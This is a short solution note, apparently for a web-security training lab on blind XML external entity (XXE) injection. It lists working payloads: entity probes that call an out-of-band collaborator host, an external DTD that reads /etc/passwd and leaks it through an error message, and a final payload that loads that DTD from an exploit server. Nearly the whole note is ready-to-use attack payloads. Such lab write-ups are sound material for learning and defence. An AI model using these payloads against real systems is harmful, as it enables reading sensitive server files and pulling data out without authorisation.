@@ -1,0 +1,23 @@
+Lab: Exploiting blind XXE to retrieve data via error messages
+Analysis: Parses XML input but does not display the result.
+Task: Use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.
+Solution:
+
+Regular ENTITY
+-------------
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://wuu7t467jm81osdue2afj68vnmtdh35s.oastify.com">]>
+
+Parameter ENTITY
+---------------
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://wuu7t467jm81osdue2afj68vnmtdh35s.oastify.com"> %xxe;]>
+
+Data Exfilteration payload
+-------------------
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+ Exploit Link: https://exploit-0a6e005c03bac13f81ad1ad201180045.exploit-server.net/exploit
+
+Final Payload:
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit-0a6e005c03bac13f81ad1ad201180045.exploit-server.net/exploit"> %xxe;]>
